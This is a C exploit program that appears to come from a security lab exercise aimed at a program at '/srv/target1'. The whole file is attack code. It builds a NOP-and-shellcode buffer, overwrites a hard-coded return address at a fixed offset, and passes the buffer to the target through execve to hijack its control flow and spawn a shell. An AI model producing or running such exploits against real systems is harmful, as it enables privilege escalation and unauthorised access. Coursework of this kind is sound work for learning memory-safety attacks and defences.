#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 20;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const int RETURN_ADDRESS_OFFSET = 16;
const char* RETURN_ADDRESS = 0xffffd6bc;

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[BUFFER_SIZE];
  memset(buf, 0x90, BUFFER_SIZE);
  memcpy(buf, shellcode, SHELLCODE_LENGTH);

  *(char**)(buf + RETURN_ADDRESS_OFFSET) = (char*)RETURN_ADDRESS;

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


